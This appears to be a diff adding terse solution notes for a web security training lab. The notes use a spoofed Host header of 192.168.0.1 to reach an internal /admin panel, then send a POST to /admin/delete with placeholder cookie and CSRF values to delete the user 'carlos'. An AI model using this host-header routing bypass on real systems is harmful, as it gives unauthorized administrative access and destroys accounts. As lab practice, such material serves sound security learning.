@@ -1,0 +1,23 @@
+## request:0
+
+path to /admin.
+Host header to 192.168.0.1.
+
+## HTML info:
+</header>
+                    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+                        <input required type="hidden" name="csrf" value="dDdu3jpQqtak7zE2teGo5O7RaclGhnVu">
+                        <label>Username</label>
+                        <input required type='text' name='username'>
+                        <button class='button' type='submit'>Delete user</button>
+
+
+## request:1
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.1
+Cookie: YOUR_INFO
+Content-Type: x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+
